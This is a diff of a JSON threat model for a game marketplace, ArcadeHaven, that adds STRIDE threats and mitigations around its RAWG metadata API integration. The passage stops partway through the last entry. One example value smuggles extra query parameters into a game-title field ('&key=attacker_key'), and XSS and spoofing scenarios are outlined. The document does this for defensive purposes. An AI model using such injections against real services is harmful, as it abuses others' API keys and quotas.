@@ -10984,8 +10984,8 @@
                 "text": "Game Search"
               },
               "body": {
-                "stroke": "#333333",
-                "strokeWidth": 1.5,
+                "stroke": "red",
+                "strokeWidth": 2.5,
                 "strokeDasharray": null
               }
             },
@@ -11082,12 +11082,99 @@
               "outOfScope": false,
               "isTrustBoundary": false,
               "reasonOutOfScope": "",
-              "hasOpenThreats": false,
+              "hasOpenThreats": true,
               "handlesCardPayment": false,
               "handlesGoodsOrServices": false,
               "isWebApplication": false,
               "privilegeLevel": "",
-              "threats": []
+              "threats": [
+                {
+                  "id": "f339f927-0ad6-4781-a74b-dd5d57091a4d",
+                  "title": "RAWG query parameter injection",
+                  "status": "Open",
+                  "severity": "High",
+                  "type": "Spoofing",
+                  "description": "A publisher submits a game title containing RAWG API query parameters (e.g. &key=attacker_key) that are appended to the RAWG request URL, replacing the legitimate API key.",
+                  "mitigation": "Build RAWG query URLs using a URL builder (never string concatenation); encode all user-supplied parameters; validate game title against an allowlist of characters.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 194,
+                  "score": ""
+                },
+                {
+                  "id": "f13e4231-c368-405e-8c1b-9e9f7acbd8e8",
+                  "title": "Search results stored without validation",
+                  "status": "Open",
+                  "severity": "Medium",
+                  "type": "Tampering",
+                  "description": "RAWG search returns a game with a malformed slug or negative metacritic score. These values are stored directly and later cause DB constraint violations or display anomalies.",
+                  "mitigation": "Validate and normalise all RAWG response fields before storage; define explicit allowed ranges and formats for each field; reject or sanitise unexpected values.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 195,
+                  "score": ""
+                },
+                {
+                  "id": "90ed7376-8fda-466c-9f47-be557936c736",
+                  "title": "No log of which RAWG result was chosen",
+                  "status": "Open",
+                  "severity": "Medium",
+                  "type": "Repudiation",
+                  "description": "Publisher searches for \"Cyberpunk\" and selects from 5 results. No log records which RAWG game ID was chosen; a later metadata dispute cannot be resolved.",
+                  "mitigation": "Log the selected RAWG game ID, publisher ID, and timestamp when a game is linked to a RAWG entry; store the RAWG game ID in the games table as a reference.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 196,
+                  "score": ""
+                },
+                {
+                  "id": "282705cc-ab77-4753-a44a-265116c468ec",
+                  "title": "RAWG API key exposed in search request logs",
+                  "status": "Open",
+                  "severity": "Medium",
+                  "type": "Information disclosure",
+                  "description": "Nginx logs full outbound request URL including ?key=rawg_api_key_here in the access log.",
+                  "mitigation": "\tPass RAWG API key in a header rather than query parameter if RAWG supports it; configure log filtering to mask the key parameter; use a proxy service that injects the key.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 197,
+                  "score": ""
+                },
+                {
+                  "id": "ec96ddde-796f-4bc6-9e78-97d4dc337426",
+                  "title": "Publisher triggering excessive RAWG searches",
+                  "status": "Open",
+                  "severity": "Medium",
+                  "type": "Denial of service",
+                  "description": "A malicious publisher script calls the game search endpoint 10,000 times/hour, exhausting the RAWG API quota for all other publishers and the entire platform.",
+                  "mitigation": "Rate-limit RAWG search calls per authenticated publisher; global daily quota tracker; cache RAWG search results for common queries.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 198,
+                  "score": ""
+                },
+                {
+                  "id": "8337fa3d-1b64-4982-a128-bfcce6782fba",
+                  "title": "Unauthenticated caller triggering RAWG lookups",
+                  "status": "Open",
+                  "severity": "Medium",
+                  "type": "Elevation of privilege",
+                  "description": "RAWG search proxy endpoint is publicly accessible without authentication; any anonymous user can trigger API calls, exhausting quota or causing cost overruns.",
+                  "mitigation": "RAWG search endpoint requires authentication (valid JWT); rate limit per authenticated user; no public/unauthenticated RAWG proxy",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 199,
+                  "score": ""
+                }
+              ],
+              "threatFrequency": {
+                "spoofing": 1,
+                "tampering": 1,
+                "repudiation": 1,
+                "informationDisclosure": 1,
+                "denialOfService": 1,
+                "elevationOfPrivilege": 1
+              }
             }
           },
           {
@@ -11104,8 +11191,8 @@
                 "text": "RAWG\nREST API"
               },
               "body": {
-                "stroke": "#333333",
-                "strokeWidth": 1.5,
+                "stroke": "red",
+                "strokeWidth": 2.5,
                 "strokeDasharray": null
               }
             },
@@ -11202,12 +11289,39 @@
               "outOfScope": false,
               "isTrustBoundary": false,
               "reasonOutOfScope": "",
-              "hasOpenThreats": false,
+              "hasOpenThreats": true,
               "handlesCardPayment": false,
               "handlesGoodsOrServices": false,
               "isWebApplication": false,
               "privilegeLevel": "",
-              "threats": []
+              "threats": [
+                {
+                  "id": "2bf9fcf2-12f3-46f3-9dfe-6815571f4e4b",
+                  "title": "Spoofed RAWG endpoint (DNS/MitM)",
+                  "status": "Open",
+                  "severity": "High",
+                  "type": "Spoofing",
+                  "description": "DNS poisoning redirects rawg.io calls to a malicious server returning crafted game metadata containing malicious URLs or scripts.",
+                  "mitigation": "Pin RAWG base URL; enforce TLS certificate validation; treat all RAWG data as untrusted input regardless of source.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 76,
+                  "score": ""
+                },
+                {
+                  "id": "5f8b9f8d-67c4-4804-98af-bf86fb2d8827",
+                  "title": "No record of what external data was consumed",
+                  "status": "Open",
+                  "severity": "Medium",
+                  "type": "Repudiation",
+                  "description": "A bad game description sourced from RAWG causes a compliance incident. No log exists of what version of the RAWG response was ingested at what time.",
+                  "mitigation": "Log raw RAWG responses with timestamp and request hash before processing; store a digest of consumed metadata in the Game record.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 77,
+                  "score": ""
+                }
+              ]
             }
           },
           {
@@ -11224,8 +11338,8 @@
                 "text": "Game\nMetadata"
               },
               "body": {
-                "stroke": "#333333",
-                "strokeWidth": 1.5,
+                "stroke": "red",
+                "strokeWidth": 2.5,
                 "strokeDasharray": null
               }
             },
@@ -11322,12 +11436,99 @@
               "outOfScope": false,
               "isTrustBoundary": false,
               "reasonOutOfScope": "",
-              "hasOpenThreats": false,
+              "hasOpenThreats": true,
               "handlesCardPayment": false,
               "handlesGoodsOrServices": false,
               "isWebApplication": false,
               "privilegeLevel": "",
-              "threats": []
+              "threats": [
+                {
+                  "id": "cd75c0d2-de08-43e6-a0a1-8b74152894a1",
+                  "title": "Metadata substitution — wrong game linked",
+                  "status": "Open",
+                  "severity": "High",
+                  "type": "Spoofing",
+                  "description": "A publisher intentionally links their low-quality game to the RAWG metadata of a popular AAA title, inheriting its high ratings and description to deceive buyers.",
+                  "mitigation": "Admin review of RAWG linkage during game approval; display both publisher-supplied and RAWG-sourced information distinctly; flag metadata mismatches for review.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 200,
+                  "score": ""
+                },
+                {
+                  "id": "c12f05e8-f587-4026-a90e-a14ed28596d8",
+                  "title": "Stored XSS via unescaped RAWG description field",
+                  "status": "Open",
+                  "severity": "High",
+                  "type": "Tampering",
+                  "description": "RAWG description containing a script tag is stored unsanitised in the games table and rendered as raw HTML to buyers",
+                  "mitigation": "HTML sanitise all RAWG text fields before storage using OWASP Java HTML Sanitizer; output-encode at render time; CSP header with script-src 'self'.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 201,
+                  "score": ""
+                },
+                {
+                  "id": "133d5eb7-9904-4aee-b4a9-c927a6ae9f67",
+                  "title": "No version history of metadata updates",
+                  "status": "Open",
+                  "severity": "Medium",
+                  "type": "Repudiation",
+                  "description": "Game metadata is updated from RAWG but the old values are overwritten; no history of what changed when; publisher disputes a metadata change claiming it was not their input.",
+                  "mitigation": "Metadata update audit trail: store old/new values with timestamp and whether origin was RAWG or publisher; allow publishers to see their game's metadata history",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 202,
+                  "score": ""
+                },
+                {
+                  "id": "c4745bf6-bf85-4ba6-bcd0-397f098d874c",
+                  "title": "Metadata refresh loop causing repeated RAWG calls",
+                  "status": "Open",
+                  "severity": "Medium",
+                  "type": "Denial of service",
+                  "description": "A bug in the metadata refresh scheduler triggers repeated calls for the same game ID every second, exhausting the RAWG quota and causing a cascading outage for all game lookups.",
+                  "mitigation": "Idempotent, debounced metadata refresh with minimum refresh interval (e.g. 24h per game); last-fetched timestamp stored in DB; dead-letter queue for failed refresh jobs.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 203,
+                  "score": ""
+                },
+                {
+                  "id": "c2085049-6918-47c2-b0c9-c102589f518f",
+                  "title": "Publisher overwriting admin-curated metadata fields",
+                  "status": "Open",
+                  "severity": "Medium",
+                  "type": "Elevation of privilege",
+                  "description": "After admin manually corrects a game description (e.g. removing inappropriate content), a RAWG metadata refresh overwrites the admin correction with the original bad content.",
+                  "mitigation": "Admin-locked fields are excluded from automatic RAWG refresh; track which fields have been manually overridden; require admin confirmation to re-sync locked fields from RAWG.\n",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 204,
+                  "score": ""
+                },
+                {
+                  "id": "8482c3db-3114-4fd2-997f-6626e3a525b6",
+                  "title": "Internal game metadata (not yet approved) accessible via RAWG linkage",
+                  "status": "Open",
+                  "severity": "Low",
+                  "type": "Information disclosure",
+                  "description": "A game in PENDING status has already been linked to RAWG; if the metadata fetch endpoint is publicly accessible by game ID, pre-release metadata is disclosed.",
+                  "mitigation": "Metadata endpoints scope results to status = ACTIVE for non-admin callers; PENDING/DRAFT games only visible to their owning publisher and admins.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 205,
+                  "score": ""
+                }
+              ],
+              "threatFrequency": {
+                "spoofing": 1,
+                "tampering": 1,
+                "repudiation": 1,
+                "informationDisclosure": 2,
+                "denialOfService": 2,
+                "elevationOfPrivilege": 1
+              }
             }
           },
           {
@@ -11344,8 +11545,8 @@
                 "text": "Game Details"
               },
               "body": {
-                "stroke": "#333333",
-                "strokeWidth": 1.5,
+                "stroke": "red",
+                "strokeWidth": 2.5,
                 "strokeDasharray": null
               }
             },
@@ -11442,12 +11643,99 @@
               "outOfScope": false,
               "isTrustBoundary": false,
               "reasonOutOfScope": "",
-              "hasOpenThreats": false,
+              "hasOpenThreats": true,
               "handlesCardPayment": false,
               "handlesGoodsOrServices": false,
               "isWebApplication": false,
               "privilegeLevel": "",
-              "threats": []
+              "threats": [
+                {
+                  "id": "001cb942-f598-4429-9f05-886cab2a6fd7",
+                  "title": "Wrong details fetched",
+                  "status": "Open",
+                  "severity": "Medium",
+                  "type": "Spoofing",
+                  "description": "Publisher supplies a forged RAWG game ID that maps to a different (better-reviewed) game; ArcadeHaven fetches and stores that game's details under the publisher's listing.",
+                  "mitigation": "Validate that the RAWG game ID returned from search corresponds to the game title supplied by the publisher; admin verification during approval.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 206,
+                  "score": ""
+                },
+                {
+                  "id": "101e3674-31b8-4820-9362-c3ab83976f53",
+                  "title": "RAWG image URL redirected to malicious content",
+                  "status": "Open",
+                  "severity": "High",
+                  "type": "Tampering",
+                  "description": "RAWG game detail includes screenshot URLs. One URL is a redirect chain ending at a malicious file. If ArcadeHaven stores and serves the URL directly rather than downloading and re-hosting, buyers are sent to a malicious site.",
+                  "mitigation": "\tDownload and re-host all RAWG images through the Game Images Handler; never serve raw external RAWG image URLs to users; validate downloaded image MIME type and size.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 207,
+                  "score": ""
+                },
+                {
+                  "id": "c8ef9677-0779-4986-b538-bbfafaa93521",
+                  "title": "\tNo record of which RAWG details version was used",
+                  "status": "Open",
+                  "severity": "Medium",
+                  "type": "Repudiation",
+                  "description": "RAWG updates a game's ESRB rating. ArcadeHaven re-fetches and overwrites. A buyer who purchased during the old rating period cannot be shown what rating they saw at purchase time.",
+                  "mitigation": "Store RAWG details snapshot (or at minimum the rating and content descriptors) in the order record at purchase time; separate live metadata from at-purchase snapshot.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 208,
+                  "score": ""
+                },
+                {
+                  "id": "c8ff3079-3e3b-4fa5-aad8-7b936aac17cb",
+                  "title": "RAWG details include embedded tracking pixels",
+                  "status": "Open",
+                  "severity": "High",
+                  "type": "Information disclosure",
+                  "description": "RAWG description HTML includes third-party analytics tracking pixels; if rendered in the ArcadeHaven frontend, user browsing behaviour is reported to RAWG or third parties.",
+                  "mitigation": "Strip all embedded tracking elements from RAWG HTML content during sanitisation; use a strict HTML allowlist (paragraphs, headings, lists, basic formatting only).",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 209,
+                  "score": ""
+                },
+                {
+                  "id": "6a1dd3e9-3b43-43e2-9dae-9b592f4a83cc",
+                  "title": "Large RAWG details response causing memory pressure",
+                  "status": "Open",
+                  "severity": "Medium",
+                  "type": "Denial of service",
+                  "description": "A RAWG game detail response includes hundreds of screenshots and a very long description; processing it for every page load creates excessive memory allocation.",
+                  "mitigation": "Limit the number of screenshots stored per game (e.g. max 10); truncate descriptions at a maximum length; process RAWG responses asynchronously and store normalised output, not raw responses.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 210,
+                  "score": ""
+                },
+                {
+                  "id": "0a135591-57fc-4da2-9764-72c0826d8310",
+                  "title": "RAWG details endpoint accessible without publisher ownership check",
+                  "status": "Open",
+                  "severity": "Critical",
+                  "type": "Elevation of privilege",
+                  "description": "Any authenticated user (including a Buyer) can trigger a RAWG detail fetch for any RAWG game ID and link it to an arbitrary existing ArcadeHaven game, modifying another publisher's listing.",
+                  "mitigation": "RAWG detail fetch and linkage operations require PUBLISHER role AND ownership of the target game; ADMIN role required to link/change RAWG ID on an already-published game.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 211,
+                  "score": ""
+                }
+              ],
+              "threatFrequency": {
+                "spoofing": 1,
+                "tampering": 1,
+                "repudiation": 1,
+                "informationDisclosure": 1,
+                "denialOfService": 1,
+                "elevationOfPrivilege": 1
+              }
             }
           },
           {
@@ -11556,7 +11844,8 @@
             "shape": "flow",
             "attrs": {
               "line": {
-                "stroke": "#333333",
+                "stroke": "red",
+                "strokeWidth": 2.5,
                 "targetMarker": {
                   "name": "block"
                 },
@@ -11577,13 +11866,97 @@
               "outOfScope": false,
               "isTrustBoundary": false,
               "reasonOutOfScope": "",
-              "hasOpenThreats": false,
+              "hasOpenThreats": true,
               "isBidirectional": false,
               "isEncrypted": false,
               "isPublicNetwork": false,
               "protocol": "",
-              "threats": [],
-              "trustBoundaryIds": []
+              "threats": [
+                {
+                  "id": "548e8629-4964-424f-b9e8-c9ee26d2caa7",
+                  "title": "Game Request query parameter injection — RAWG API abuse",
+                  "status": "Open",
+                  "severity": "High",
+                  "type": "Tampering",
+                  "description": "A publisher submits a game title containing RAWG query string metacharacters: Cyberpunk&key=attacker_key&page_size=999. If the Game Search process builds the RAWG request URL by string concatenation rather than a URL builder, the injected parameters override the legitimate API key and page size, causing ArcadeHaven to use the attacker's quota (exhausting it) or fetching unexpected result volumes that overwhelm the response handler.",
+                  "mitigation": "Build all RAWG request URLs using a proper HTTP client URL builder (e.g. UriComponentsBuilder in Spring) that encodes each parameter individually — never concatenate query strings; validate the game title input against an allowlist of safe characters before it is used in any outbound request; set a maximum input length on the game title search field.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 212,
+                  "score": ""
+                },
+                {
+                  "id": "af97b56a-b0bb-4645-b332-b00e9d9b7798",
+                  "title": "RAWG API key exposed in Game Request URL — logged by Nginx or intermediaries",
+                  "status": "Open",
+                  "severity": "Critical",
+                  "type": "Information disclosure",
+                  "description": "The Game Request transmits the RAWG API key as a query parameter: GET https://api.rawg.io/api/games?key=rawg_secret_key&search=cyberpunk. This full URL is written to Nginx access logs, application DEBUG logs, and potentially to third-party APM tools (Datadog, New Relic). Any developer, log reader, or monitoring system now holds the API key. An attacker with log access can use the key to exhaust ArcadeHaven's RAWG quota or for their own projects.",
+                  "mitigation": "Inject the RAWG API key as an HTTP header rather than a query parameter if RAWG's API supports it; if a query parameter is required, configure Nginx and all logging frameworks to mask or strip the key parameter value from logged URLs; store the API key in a secrets manager (environment variable / Vault) — never hardcode; rotate the API key immediately if log exposure is suspected.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 213,
+                  "score": ""
+                },
+                {
+                  "id": "3ee81e44-021a-4137-ad3e-68e4e073304e",
+                  "title": "RAWG API unavailability blocking synchronous game search flow",
+                  "status": "Open",
+                  "severity": "Medium",
+                  "type": "Denial of service",
+                  "description": "RAWG experiences an outage or returns 503 responses. The Game Request flow has no timeout configured on the HTTP client — the Spring RestTemplate call blocks indefinitely waiting for a response. All threads handling publisher game search requests are held open, exhausting the ArcadeHaven thread pool and blocking unrelated operations across the entire application.",
+                  "mitigation": "Set explicit connect (3s) and read (5s) timeouts on the RAWG HTTP client; use Spring WebClient (non-blocking) instead of RestTemplate for all outbound RAWG calls; implement a Resilience4j circuit breaker wrapping all Game Request calls that opens after N consecutive failures and returns a user-friendly \"search temporarily unavailable\" message; never let an external dependency block threads indefinitely.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 214,
+                  "score": ""
+                },
+                {
+                  "id": "56301f2f-c137-4b02-88ce-59629eed832a",
+                  "title": "Game Response contains unexpected schema — breaking downstream processing",
+                  "status": "Open",
+                  "severity": "Medium",
+                  "type": "Tampering",
+                  "description": "RAWG silently changes its API response schema (e.g. renames the id field to game_id or changes rating from a float to a string). The Game Response is now structurally different from what the Game Search process expects. If the deserialisation fails silently (returning null values), downstream logic may write null game IDs or ratings to the datastore, corrupting the catalogue data for all affected entries.",
+                  "mitigation": "Configure Jackson with DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES = false but FAIL_ON_NULL_FOR_PRIMITIVES = true; validate required fields (id, title) are present and non-null after deserialisation before any further use; log a structured alert when unexpected fields appear in the response; pin to a specific RAWG API version in the request URL (e.g. /api/v1/) if available.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 215,
+                  "score": ""
+                },
+                {
+                  "id": "6441aa4e-9a68-4d3e-a044-4b5da668ea63",
+                  "title": "Game Response body logged in full — unnecessary data retention",
+                  "status": "Open",
+                  "severity": "Medium",
+                  "type": "Information disclosure",
+                  "description": "The Game Search process logs the complete RAWG Game Response body at DEBUG level for troubleshooting. Each response contains dozens of game records with descriptions, image URLs, and metadata. Over time, the log store accumulates a large volume of RAWG data that is retained beyond its useful lifetime, increasing the risk of a secondary data exposure and potentially violating RAWG's terms of service on data retention.",
+                  "mitigation": "Log only the RAWG game count and response status code from the Game Response — never the full body; use structured logging with an explicit field allowlist; disable DEBUG logging in production environments; implement a log retention policy aligned with RAWG's terms of service.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 217,
+                  "score": ""
+                },
+                {
+                  "id": "ad69b139-02a9-4025-977a-62c9b2f46171",
+                  "title": "Large Game Response payload causing memory pressure on deserialisation",
+                  "status": "Open",
+                  "severity": "Low",
+                  "type": "Denial of service",
+                  "description": "A very broad search term (e.g. \"a\") matches thousands of RAWG games. The Game Response is a multi-megabyte JSON payload. Deserialising it fully into memory creates a large object allocation that stresses the JVM heap, especially under concurrent publisher searches, potentially triggering frequent GC pauses.",
+                  "mitigation": "Set a maximum page_size parameter on all Game Requests (e.g. page_size=20); validate that the response content length does not exceed a configured maximum before deserialisation; stream-parse large responses using Jackson's streaming API instead of full object mapping if large responses are anticipated.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 218,
+                  "score": ""
+                }
+              ],
+              "trustBoundaryIds": [],
+              "threatFrequency": {
+                "tampering": 2,
+                "informationDisclosure": 2,
+                "denialOfService": 2
+              }
             },
             "labels": [
               "Game\nRequest"
@@ -11608,7 +11981,8 @@
             "shape": "flow",
             "attrs": {
               "line": {
-                "stroke": "#333333",
+                "stroke": "red",
+                "strokeWidth": 2.5,
                 "targetMarker": {
                   "name": "block"
                 },
@@ -11629,12 +12003,91 @@
               "outOfScope": false,
               "isTrustBoundary": false,
               "reasonOutOfScope": "",
-              "hasOpenThreats": false,
+              "hasOpenThreats": true,
               "isBidirectional": false,
               "isEncrypted": false,
               "isPublicNetwork": false,
               "protocol": "",
-              "threats": [],
+              "threats": [
+                {
+                  "id": "548e8629-4964-424f-b9e8-c9ee26d2caa7",
+                  "title": "Game Request query parameter injection — RAWG API abuse",
+                  "status": "Open",
+                  "severity": "High",
+                  "type": "Tampering",
+                  "description": "A publisher submits a game title containing RAWG query string metacharacters: Cyberpunk&key=attacker_key&page_size=999. If the Game Search process builds the RAWG request URL by string concatenation rather than a URL builder, the injected parameters override the legitimate API key and page size, causing ArcadeHaven to use the attacker's quota (exhausting it) or fetching unexpected result volumes that overwhelm the response handler.",
+                  "mitigation": "Build all RAWG request URLs using a proper HTTP client URL builder (e.g. UriComponentsBuilder in Spring) that encodes each parameter individually — never concatenate query strings; validate the game title input against an allowlist of safe characters before it is used in any outbound request; set a maximum input length on the game title search field.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 212,
+                  "score": ""
+                },
+                {
+                  "id": "af97b56a-b0bb-4645-b332-b00e9d9b7798",
+                  "title": "RAWG API key exposed in Game Request URL — logged by Nginx or intermediaries",
+                  "status": "Open",
+                  "severity": "Critical",
+                  "type": "Information disclosure",
+                  "description": "The Game Request transmits the RAWG API key as a query parameter: GET https://api.rawg.io/api/games?key=rawg_secret_key&search=cyberpunk. This full URL is written to Nginx access logs, application DEBUG logs, and potentially to third-party APM tools (Datadog, New Relic). Any developer, log reader, or monitoring system now holds the API key. An attacker with log access can use the key to exhaust ArcadeHaven's RAWG quota or for their own projects.",
+                  "mitigation": "Inject the RAWG API key as an HTTP header rather than a query parameter if RAWG's API supports it; if a query parameter is required, configure Nginx and all logging frameworks to mask or strip the key parameter value from logged URLs; store the API key in a secrets manager (environment variable / Vault) — never hardcode; rotate the API key immediately if log exposure is suspected.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 213,
+                  "score": ""
+                },
+                {
+                  "id": "3ee81e44-021a-4137-ad3e-68e4e073304e",
+                  "title": "RAWG API unavailability blocking synchronous game search flow",
+                  "status": "Open",
+                  "severity": "Medium",
+                  "type": "Denial of service",
+                  "description": "RAWG experiences an outage or returns 503 responses. The Game Request flow has no timeout configured on the HTTP client — the Spring RestTemplate call blocks indefinitely waiting for a response. All threads handling publisher game search requests are held open, exhausting the ArcadeHaven thread pool and blocking unrelated operations across the entire application.",
+                  "mitigation": "Set explicit connect (3s) and read (5s) timeouts on the RAWG HTTP client; use Spring WebClient (non-blocking) instead of RestTemplate for all outbound RAWG calls; implement a Resilience4j circuit breaker wrapping all Game Request calls that opens after N consecutive failures and returns a user-friendly \"search temporarily unavailable\" message; never let an external dependency block threads indefinitely.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 214,
+                  "score": ""
+                },
+                {
+                  "id": "56301f2f-c137-4b02-88ce-59629eed832a",
+                  "title": "Game Response contains unexpected schema — breaking downstream processing",
+                  "status": "Open",
+                  "severity": "Medium",
+                  "type": "Tampering",
+                  "description": "RAWG silently changes its API response schema (e.g. renames the id field to game_id or changes rating from a float to a string). The Game Response is now structurally different from what the Game Search process expects. If the deserialisation fails silently (returning null values), downstream logic may write null game IDs or ratings to the datastore, corrupting the catalogue data for all affected entries.",
+                  "mitigation": "Configure Jackson with DeserializationFeature.FAIL_ON_UNKNOWN_PROPERTIES = false but FAIL_ON_NULL_FOR_PRIMITIVES = true; validate required fields (id, title) are present and non-null after deserialisation before any further use; log a structured alert when unexpected fields appear in the response; pin to a specific RAWG API version in the request URL (e.g. /api/v1/) if available.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 215,
+                  "score": ""
+                },
+                {
+                  "id": "6441aa4e-9a68-4d3e-a044-4b5da668ea63",
+                  "title": "Game Response body logged in full — unnecessary data retention",
+                  "status": "Open",
+                  "severity": "Medium",
+                  "type": "Information disclosure",
+                  "description": "The Game Search process logs the complete RAWG Game Response body at DEBUG level for troubleshooting. Each response contains dozens of game records with descriptions, image URLs, and metadata. Over time, the log store accumulates a large volume of RAWG data that is retained beyond its useful lifetime, increasing the risk of a secondary data exposure and potentially violating RAWG's terms of service on data retention.",
+                  "mitigation": "Log only the RAWG game count and response status code from the Game Response — never the full body; use structured logging with an explicit field allowlist; disable DEBUG logging in production environments; implement a log retention policy aligned with RAWG's terms of service.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 217,
+                  "score": ""
+                },
+                {
+                  "id": "ad69b139-02a9-4025-977a-62c9b2f46171",
+                  "title": "Large Game Response payload causing memory pressure on deserialisation",
+                  "status": "Open",
+                  "severity": "Low",
+                  "type": "Denial of service",
+                  "description": "A very broad search term (e.g. \"a\") matches thousands of RAWG games. The Game Response is a multi-megabyte JSON payload. Deserialising it fully into memory creates a large object allocation that stresses the JVM heap, especially under concurrent publisher searches, potentially triggering frequent GC pauses.",
+                  "mitigation": "Set a maximum page_size parameter on all Game Requests (e.g. page_size=20); validate that the response content length does not exceed a configured maximum before deserialisation; stream-parse large responses using Jackson's streaming API instead of full object mapping if large responses are anticipated.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 218,
+                  "score": ""
+                }
+              ],
               "trustBoundaryIds": []
             },
             "labels": [
@@ -11660,7 +12113,8 @@
             "shape": "flow",
             "attrs": {
               "line": {
-                "stroke": "#333333",
+                "stroke": "red",
+                "strokeWidth": 2.5,
                 "targetMarker": {
                   "name": "block"
                 },
@@ -11681,12 +12135,91 @@
               "outOfScope": false,
               "isTrustBoundary": false,
               "reasonOutOfScope": "",
-              "hasOpenThreats": false,
+              "hasOpenThreats": true,
               "isBidirectional": false,
               "isEncrypted": false,
               "isPublicNetwork": false,
               "protocol": "",
-              "threats": [],
+              "threats": [
+                {
+                  "id": "9271fee3-06e1-402c-8052-ee7b264447ca",
+                  "title": "Game Details Response age rating tampered — minor accessing adult content",
+                  "status": "Open",
+                  "severity": "Critical",
+                  "type": "Tampering",
+                  "description": "The Game Details Response for an 18+ game is intercepted and the age_rating field is changed from MATURE to EVERYONE. ArcadeHaven stores this forged rating and does not restrict the game's sale to minors. A minor purchases and accesses content they should be legally prohibited from viewing. This creates serious regulatory liability (PEGI/ESRB compliance) and potential legal consequences for the platform operator.",
+                  "mitigation": "Enforce TLS with certificate pinning or strict CA validation on all RAWG connections to prevent MitM tampering of the Details Response; treat all age rating data as potentially untrusted and verify it against a known enumeration of valid PEGI/ESRB values (reject unknown values rather than defaulting to the least restrictive rating); store the rating received at game creation time and require explicit admin re-approval if the rating changes on a re-fetch.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 225,
+                  "score": ""
+                },
+                {
+                  "id": "05ac801d-a15a-4edf-8b17-e6e4b7309f6e",
+                  "title": "Game Details Response contains developer/publisher PII from RAWG",
+                  "status": "Open",
+                  "severity": "Medium",
+                  "type": "Information disclosure",
+                  "description": "RAWG's Game Details Response includes the name, website, and contact details of individual developers listed on the game. If ArcadeHaven stores and displays this data without checking whether the individuals have consented to having their personal data processed by a third party, it may violate GDPR Article 6 (lawful basis for processing) for that PII.",
+                  "mitigation": "Review which fields from the Game Details Response are stored and displayed; limit storage to non-personal fields (studio name, not individual developer names) unless a clear legitimate interest or consent basis exists; document RAWG as a third-party data source in the ArcadeHaven GDPR Record of Processing Activities; consider stripping individual-level PII from the Details Response before storage.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 226,
+                  "score": ""
+                },
+                {
+                  "id": "4e3d049c-c211-4fee-938a-abb6bc4cbe92",
+                  "title": "\tMalformed RAWG game ID in Game Details Request causing repeated 404 errors",
+                  "status": "Open",
+                  "severity": "Medium",
+                  "type": "Denial of service",
+                  "description": "A publisher submits an invalid or non-existent RAWG game ID. The Game Details Request receives a 404 from RAWG. A retry mechanism without a backoff strategy immediately re-sends the request, repeatedly receiving 404 responses. If many publishers simultaneously submit invalid IDs, the flood of failing Game Details Requests consumes RAWG quota for invalid lookups and creates noise in the error monitoring system.",
+                  "mitigation": "Validate the RAWG game ID format before sending any Game Details Request (must be a positive integer); on a 404 response, mark the game's rawg_id as invalid in the Game Datastore and do not retry — surface a validation error to the publisher; exponential backoff only for transient errors (5xx), not for client errors (4xx) which should fail immediately.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 227,
+                  "score": ""
+                },
+                {
+                  "id": "502b957f-ca4b-4b10-8dd7-a324a66e6fb4",
+                  "title": "Game Details Response snapshot not stored at purchase time — rating change affects past buyers",
+                  "status": "Open",
+                  "severity": "High",
+                  "type": "Tampering",
+                  "description": "A buyer purchases a game rated TEEN. RAWG later updates the game's rating to MATURE. ArcadeHaven re-fetches the Game Details and overwrites the stored rating. The order record now refers to a MATURE game even though the buyer consented to a TEEN-rated purchase — the stored evidence of what the buyer purchased no longer matches the current record, creating compliance and dispute resolution problems.",
+                  "mitigation": "Store a snapshot of the relevant Details Response fields (age_rating, content_descriptors, title) in the order_items record at the time of purchase — this captures what the buyer saw and consented to; the live game listing can be updated from new Details Responses but the historical order snapshot is immutable; display the at-purchase rating in order history and invoice.",
+                  "modelType": "STRIDE",
+                  "new": false,
+                  "number": 228,
+                  "score": ""
+                },
+                {
+                  "id": "971d61c2-807c-4c5a-868b-290f68d8fcac",
+                  "title": "Game Details Response cached insecurely — stale or misattributed details served",
+                  "status": "Open",
+                  "severity": "Low",
+                  "type": "Information disclosure",
+                  "description": "The Game Details Response is cached using the RAWG game ID as the cache key without a user or game context component. Two publishers request details for the same RAWG game ID at nearly the same time; the second publisher receives the cached response from the first request. While the data itself is the same, the cache entry may be inadvertently associated with the wrong publisher's game listing if the cache key does not include the ArcadeHaven game ID.",
